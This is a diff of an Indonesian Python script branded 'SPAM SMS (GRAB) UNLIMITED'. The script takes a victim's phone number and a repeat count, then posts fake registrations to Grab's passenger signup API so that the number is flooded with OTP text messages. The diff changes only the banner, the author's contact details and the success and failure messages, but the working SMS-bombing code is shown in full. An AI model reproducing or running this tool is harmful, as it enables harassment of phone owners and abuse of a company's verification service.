@@ -9,7 +9,6 @@ try:
 	import subprocess as sp
 	import requests
 except ModuleNotFoundError:
-	print("\nSepertinya module requests belum di install")
 	print("$ pip install requests\n")
 	exit()
 
@@ -17,13 +16,12 @@ try:
 	os.system('clear')
 	print("""\033[1;32m
    _  _
- _| || |_   \033[1;36m..::SPAM OTP GRAB UNLIMITED::..\033[1;32m
-|_  ..  _|  \033[1;31mPenyusun : Henrycko\033[1;32m
-|_      _|  \033[1;31mPendukung: Dzakira Alzena Daiva\033[1;32m
-  |_||_|    \033[1;31mContact  : thetermuxchoice@gmail.com\033[1;32m
+ _| || |_   \033[1;31mAuthor  :Henrycko\033[1;32m
+|_  ..  _|  \033[1;31mContact :https://fb.me/Henrycko.xyz\033[1;32m
+|_      _|  \033[1;31mgithub  :https://github.com/Henrycko.xyz\033[1;32m
+  |_||_|    \033[1;36m~ SPAM SMS (GRAB) UNLIMITED ~\033[1;32m
 """)
-	
-	no = input("\033[1;37m[?] Nomor (62) =>\033[1;36m ")
+	no = input("\033[1;37m[?] NOMOR (62) =>\033[1;36m ")
 	jum=int(input("\033[1;37m[?] Jumlah => \033[1;36m"))
 except KeyboardInterrupt:
 	print("\nKey interrupt")
@@ -36,9 +34,9 @@ def main(arg):
 		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
 #		print(r.text)
 		if str(idk) in str(r.text):
-			print("\033[1;32m[+] Berhasil!")
+			print("\033[1;32m[!] BERHASIL")
 		else:
-			print("\033[1;31m[-] Gagal!")
+			print("\033[1;31m[!] GAGAL")
 	except: pass
 
 jobs = []
